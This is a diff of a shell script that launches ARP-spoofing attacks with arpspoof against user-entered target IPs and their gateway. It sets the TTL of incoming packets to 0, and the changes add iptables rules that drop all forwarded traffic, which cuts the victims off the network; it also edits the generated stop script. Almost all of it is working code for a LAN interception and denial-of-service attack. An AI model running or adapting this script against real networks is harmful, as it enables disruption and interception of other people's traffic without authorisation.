@@ -73,6 +73,8 @@ read -p "Enter Target; Single IP, Multiple IPs separated by space, or Subnet e.g
 
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -P FORWARD DROP 
+iptables -I FORWARD -j DROP
 
 # Set TTL to 0 for incoming packets
 iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
@@ -90,7 +92,7 @@ fi
 for TARGET_IP in "${TARGET_IPS[@]}"; do
     if validate_ip "$TARGET_IP"; then
         if [ "$TARGET_IP" != "$DEVICE_IP" ] && [ "$TARGET_IP" != "$GATEWAY_IP" ]; then
-            echo "Blocking TTL for target: $TARGET_IP"
+            echo "Blocking TTL for target IP: $TARGET_IP"
             arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY_IP" &
             arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" "$TARGET_IP" &
         else
@@ -106,7 +108,9 @@ cat > /bin/ttl-stop << EOF
 #!/bin/sh
 
 pkill -f arpspoof
-iptables -t mangle -F
+iptables -P FORWARD ACCEPT
+iptables -F FORWARD 
+iptables -t mangle -D PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
 EOF
 chmod 755 /bin/ttl-stop
 
